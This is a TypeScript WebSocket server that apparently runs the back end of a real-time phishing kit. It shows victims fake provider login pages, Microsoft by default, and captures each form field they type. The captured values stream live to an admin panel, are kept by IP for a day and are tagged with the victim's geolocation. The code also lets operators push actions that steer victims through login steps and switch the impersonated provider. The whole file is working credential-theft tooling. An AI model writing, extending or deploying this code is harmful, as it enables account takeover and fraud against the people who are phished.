import type { IncomingMessage } from 'http';
import type { Server } from 'http';
import { readFileSync, writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';
import { WebSocketServer, WebSocket } from 'ws';
import { logger } from './lib/logger.js';

// Persist provider selection across server restarts so it never resets to
// 'microsoft' unless the admin explicitly changes it.
const PROVIDER_FILE = join(process.cwd(), '.provider');
function _loadProvider(): string {
  try { return readFileSync(PROVIDER_FILE, 'utf8').trim() || 'microsoft'; } catch { return 'microsoft'; }
}
function _saveProvider(p: string): void {
  try { mkdirSync(join(process.cwd()), { recursive: true }); writeFileSync(PROVIDER_FILE, p, 'utf8'); } catch { /* ignore */ }
}

const SITE_FILE = join(process.cwd(), '.site-active');
function _loadSiteActive(): boolean {
  try { return readFileSync(SITE_FILE, 'utf8').trim() !== 'false'; } catch { return true; }
}
function _saveSiteActive(active: boolean): void {
  try { writeFileSync(SITE_FILE, active ? 'true' : 'false', 'utf8'); } catch { /* ignore */ }
}

interface Location {
  city: string;
  country: string;
  countryCode: string;
  flag: string;
}

interface FormEntry {
  field: string;
  value: string;
  ts: number;
}

interface Visitor {
  id: string;
  ws: WebSocket;
  ip: string;
  location: Location;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
  formHistory: FormEntry[];
}

interface VisitorPublic {
  id: string;
  ip: string;
  location: Location;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
  formHistory: FormEntry[];
}

interface PersistedSession {
  formData: Record<string, string>;
  formHistory: FormEntry[];
  provider: string;
  step: string;
  location: Location;
  userAgent: string;
  lastSeen: number;
}

const visitors = new Map<string, Visitor>();
const admins = new Set<WebSocket>();
const adminWatching = new Map<WebSocket, string | null>(); // ws → visitorId being watched
const views = new Map<string, Set<WebSocket>>();
const persistedByIP = new Map<string, PersistedSession>();
export let globalProvider = _loadProvider();
export let siteActive = _loadSiteActive();

function countWatchers(visitorId: string): number {
  let n = 0;
  for (const id of adminWatching.values()) if (id === visitorId) n++;
  return n;
}

const SESSION_TTL_MS = 24 * 60 * 60 * 1000;

function getClientIP(req: IncomingMessage): string {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) {
    const raw = Array.isArray(fwd) ? fwd[0] : fwd;
    return raw.split(',')[0]?.trim() ?? '0.0.0.0';
  }
  return req.socket.remoteAddress ?? '0.0.0.0';
}

async function fetchLocation(ip: string): Promise<Location> {
  const clean = ip.replace(/^::ffff:/, '');
  const isLocal =
    clean === '127.0.0.1' || clean === '::1' ||
    clean.startsWith('10.') || clean.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(clean);
  if (isLocal) return { city: 'Local Network', country: 'Local', countryCode: 'XX', flag: '🖥️' };
  try {
    const res = await fetch(`http://ip-api.com/json/${clean}?fields=status,city,country,countryCode`);
    const data = await (res.json() as Promise<{ status: string; city: string; country: string; countryCode: string }>);
    if (data.status === 'success') {
      const flag = data.countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
      return { city: data.city, country: data.country, countryCode: data.countryCode, flag };
    }
  } catch (err) {
    logger.warn({ err }, 'geolocation fetch failed');
  }
  return { city: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐' };
}

function broadcastToAdmins(data: object) {
  const msg = JSON.stringify(data);
  for (const ws of admins) {
    if (ws.readyState === WebSocket.OPEN) ws.send(msg);
  }
}

function broadcastToVisitors(data: object) {
  const msg = JSON.stringify(data);
  for (const v of visitors.values()) {
    if (v.ws.readyState === WebSocket.OPEN) v.ws.send(msg);
  }
}

export function getSiteActive(): boolean { return siteActive; }

export function setSiteActive(active: boolean): void {
  siteActive = active;
  _saveSiteActive(active);
  broadcastToVisitors({ type: 'site-status', active });
  broadcastToAdmins({ type: 'site-status', active });
}

function relayToViews(visitorId: string, data: object) {
  const viewSet = views.get(visitorId);
  if (!viewSet) return;
  const msg = JSON.stringify(data);
  for (const ws of viewSet) {
    if (ws.readyState === WebSocket.OPEN) ws.send(msg);
  }
}

function toPublic(v: Visitor): VisitorPublic {
  return {
    id: v.id, ip: v.ip, location: v.location, provider: v.provider,
    step: v.step, userAgent: v.userAgent, connectedAt: v.connectedAt,
    formData: { ...v.formData },
    formHistory: [...v.formHistory],
  };
}

function persistVisitor(v: Visitor) {
  persistedByIP.set(v.ip, {
    formData: { ...v.formData },
    formHistory: [...v.formHistory],
    provider: v.provider,
    step: v.step,
    location: v.location,
    userAgent: v.userAgent,
    lastSeen: Date.now(),
  });
}

function getPersistedSession(ip: string): PersistedSession | null {
  const s = persistedByIP.get(ip);
  if (!s) return null;
  if (Date.now() - s.lastSeen > SESSION_TTL_MS) { persistedByIP.delete(ip); return null; }
  return s;
}

// ── Heartbeat ─────────────────────────────────────────────────────────────────
// Send an application-level ping every 25 s. Clients that haven't responded
// within two intervals (50 s) are considered dead and forcibly terminated.
// This prevents the Replit reverse-proxy from closing idle WS connections.
const PING_INTERVAL_MS = 25_000;
const PONG_TIMEOUT_MS  = 50_000;
const lastPong = new WeakMap<WebSocket, number>();

function startHeartbeat(wss: WebSocketServer) {
  setInterval(() => {
    const now = Date.now();
    for (const client of wss.clients) {
      const seen = lastPong.get(client) ?? now; // treat brand-new sockets as alive
      if (now - seen > PONG_TIMEOUT_MS) { client.terminate(); continue; }
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ type: 'ping' }));
      }
    }
  }, PING_INTERVAL_MS);
}

export function setupWebSocket(server: Server) {
  const wss = new WebSocketServer({ server, path: '/api/ws' });
  startHeartbeat(wss);

  wss.on('connection', (ws: WebSocket, req: IncomingMessage) => {
    lastPong.set(ws, Date.now()); // treat fresh connection as alive
    const ip = getClientIP(req);

    ws.once('message', (raw) => {
      let msg: Record<string, unknown>;
      try { msg = JSON.parse(raw.toString()) as Record<string, unknown>; }
      catch { ws.close(); return; }

      // ── Admin ─────────────────────────────────────────────────────────────
      if (msg['type'] === 'register-admin') {
        const requiredPasscode = process.env['ADMIN_PASSCODE'];
        if (requiredPasscode && msg['passcode'] !== requiredPasscode) {
          try { ws.send(JSON.stringify({ type: 'auth-error', message: 'Invalid passcode' })); } catch { /* ignore */ }
          ws.close();
          return;
        }
        admins.add(ws);
        adminWatching.set(ws, null);
        broadcastToAdmins({ type: 'admin-count', count: admins.size });
        ws.send(JSON.stringify({ type: 'visitors', visitors: Array.from(visitors.values()).map(toPublic), globalProvider }));

        ws.on('message', (raw2) => {
          try {
            const m = JSON.parse(raw2.toString()) as Record<string, unknown>;

            if (m['type'] === 'pong') { lastPong.set(ws, Date.now()); return; }

            if (m['type'] === 'watch-visitor') {
              const prevId = adminWatching.get(ws) ?? null;
              const newId = (m['visitorId'] as string | null) ?? null;
              adminWatching.set(ws, newId);
              if (prevId && prevId !== newId) {
                broadcastToAdmins({ type: 'visitor-watchers', visitorId: prevId, count: countWatchers(prevId) });
              }
              if (newId) {
                broadcastToAdmins({ type: 'visitor-watchers', visitorId: newId, count: countWatchers(newId) });
              }

            } else if (m['type'] === 'push-action') {
              const vid = m['visitorId'] as string;
              const visitor = visitors.get(vid);
              if (visitor?.ws.readyState === WebSocket.OPEN) {
                visitor.ws.send(JSON.stringify({ type: 'action', action: m['action'] }));
              }
              relayToViews(vid, { type: 'action', action: m['action'] });
              logger.info({ visitorId: vid, action: m['action'] }, 'Admin pushed action');

            } else if (m['type'] === 'switch-provider') {
              const newProvider = m['provider'] as string;
              globalProvider = newProvider;
              _saveProvider(newProvider);
              const switchMsg = JSON.stringify({ type: 'switch-provider', provider: newProvider });
              for (const visitor of visitors.values()) {
                if (visitor.ws.readyState === WebSocket.OPEN) visitor.ws.send(switchMsg);
              }
              broadcastToAdmins({ type: 'global-provider', provider: newProvider });
              logger.info({ provider: newProvider }, 'Admin broadcast switch-provider');

            } else if (m['type'] === 'delete-form-data') {
              const vid = m['visitorId'] as string;
              const field = m['field'] as string | undefined;
              const visitor = visitors.get(vid);
              if (visitor) {
                if (!field || field === '*') {
                  visitor.formData = {};
                  visitor.formHistory = [];
                  const persisted = persistedByIP.get(visitor.ip);
                  if (persisted) { persisted.formData = {}; persisted.formHistory = []; }
                  broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field: '*' });
                } else {
                  delete visitor.formData[field];
                  visitor.formHistory = visitor.formHistory.filter(e => e.field !== field);
                  const persisted = persistedByIP.get(visitor.ip);
                  if (persisted) {
                    delete persisted.formData[field];
                    persisted.formHistory = persisted.formHistory.filter(e => e.field !== field);
                  }
                  broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field });
                }
              } else {
                const persisted = persistedByIP.get(ip);
                if (persisted) {
                  if (!field || field === '*') { persisted.formData = {}; persisted.formHistory = []; }
                  else { delete persisted.formData[field]; persisted.formHistory = persisted.formHistory.filter(e => e.field !== field); }
                }
              }

            } else if (m['type'] === 'delete-visitor') {
              const vid = m['visitorId'] as string;
              const v = visitors.get(vid);
              if (v) {
                persistedByIP.delete(v.ip);
                visitors.delete(vid);
              }
              broadcastToAdmins({ type: 'visitor-deleted', id: vid });
              logger.info({ visitorId: vid }, 'Admin deleted visitor record');
            }
          } catch (err) { logger.warn({ err }, 'Admin message parse error'); }
        });

        ws.on('close', () => {
          const watchingId = adminWatching.get(ws) ?? null;
          admins.delete(ws);
          adminWatching.delete(ws);
          broadcastToAdmins({ type: 'admin-count', count: admins.size });
          if (watchingId) {
            broadcastToAdmins({ type: 'visitor-watchers', visitorId: watchingId, count: countWatchers(watchingId) });
          }
        });
        logger.info('Admin connected');

      // ── View-only (modal iframe) ───────────────────────────────────────────
      } else if (msg['type'] === 'register-view') {
        const targetId = msg['targetId'] as string;
        if (!views.has(targetId)) views.set(targetId, new Set());
        views.get(targetId)!.add(ws);

        const visitor = visitors.get(targetId);
        if (visitor) {
          ws.send(JSON.stringify({ type: 'action', action: { navigate: visitor.step } }));
        }

        ws.on('close', () => {
          const viewSet = views.get(targetId);
          if (viewSet) { viewSet.delete(ws); if (viewSet.size === 0) views.delete(targetId); }
        });

      // ── Visitor ───────────────────────────────────────────────────────────
      } else if (msg['type'] === 'register-visitor') {
        const id = msg['id'] as string;
        const persisted = getPersistedSession(ip);

        // Immediately push the admin-selected global provider so the visitor
        // switches to the correct login page without waiting for the HTTP fetch.
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({ type: 'switch-provider', provider: globalProvider }));
        }

        // Register the visitor synchronously so form-data / step-update messages
        // that arrive while the async IP geolocation lookup is in-flight are not
        // silently dropped (visitors.get(id) returning undefined was the bug).
        // Prefer the persisted step so the admin sees the visitor exactly where
        // they left off, even if the page reloaded and the client sent 'email'.
        const restoredStep = persisted?.step || (msg['step'] as string) || 'email';
        const visitor: Visitor = {
          id, ws, ip,
          location: { city: '', country: '', countryCode: '', flag: '' },
          provider: persisted?.provider || (msg['provider'] as string) || 'microsoft',
          step: restoredStep,
          userAgent: (msg['userAgent'] as string) || '',
          connectedAt: Date.now(),
          formData: persisted ? { ...persisted.formData } : {},
          formHistory: persisted ? [...persisted.formHistory] : [],
        };
        visitors.set(id, visitor);

        // Broadcast immediately so the admin sees the visitor and doesn't miss
        // form-data events that arrive while geolocation is in-flight.
        broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });

        // Tell the visitor to restore their last step (fires after switch-provider
        // so the correct provider component is already mounting).
        if (persisted?.step && persisted.step !== 'email' && ws.readyState === WebSocket.OPEN) {
          setTimeout(() => {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({ type: 'action', action: { navigate: persisted.step } }));
            }
          }, 800);
        }
        logger.info({ id, ip, restoredFields: Object.keys(visitor.formData).length }, 'Visitor connected');

        fetchLocation(ip).then((location) => {
          const v = visitors.get(id);
          if (v) {
            v.location = location;
            broadcastToAdmins({ type: 'visitor-location', id, location });
          }
        }).catch((err) => logger.warn({ err }, 'Failed to fetch visitor location'));

        ws.on('message', (raw2) => {
          try {
            const m = JSON.parse(raw2.toString()) as Record<string, unknown>;

            if (m['type'] === 'pong') { lastPong.set(ws, Date.now()); return; }

            if (m['type'] === 'step-update') {
              const v = visitors.get(id);
              if (v) {
                v.step = (m['step'] as string) ?? v.step;
                if (m['provider']) v.provider = m['provider'] as string;
                broadcastToAdmins({ type: 'visitor-updated', id, step: v.step, provider: v.provider });
                relayToViews(id, { type: 'action', action: { navigate: v.step } });
              }
            } else if (m['type'] === 'form-data') {
              const v = visitors.get(id);
              if (v) {
                const field = m['field'] as string;
                const value = m['value'] as string;
                const ts = Date.now();
                v.formData[field] = value;
                v.formHistory.push({ field, value, ts });
                broadcastToAdmins({ type: 'visitor-form-data', id, field, value, ts });
                persistVisitor(v);
                logger.info({ id, field }, 'Visitor form-data captured (ws)');
              }
            }
          } catch (err) { logger.warn({ err }, 'Visitor message parse error'); }
        });

        ws.on('close', () => {
          const v = visitors.get(id);
          if (v) persistVisitor(v);
          visitors.delete(id);
          broadcastToAdmins({ type: 'visitor-left', id });
          logger.info({ id }, 'Visitor disconnected');
        });

      } else { ws.close(); }
    });
  });

  logger.info('WebSocket server ready at /api/ws');
}

/** HTTP fallback: called from POST /api/capture when WS form-data path fails. */
export function captureFormDataHTTP(visitorId: string, field: string, value: string): { ok: boolean; stored: boolean } {
  const v = visitors.get(visitorId);
  if (v) {
    const ts = Date.now();
    v.formData[field] = value;
    v.formHistory.push({ field, value, ts });
    broadcastToAdmins({ type: 'visitor-form-data', id: visitorId, field, value, ts });
    persistVisitor(v);
    logger.info({ id: visitorId, field }, 'Visitor form-data captured (http)');
    return { ok: true, stored: true };
  }
  // Visitor may have disconnected; persist by IP not possible without it, so just acknowledge
  logger.warn({ visitorId, field }, 'HTTP capture: visitor not found in active map');
  return { ok: true, stored: false };
}
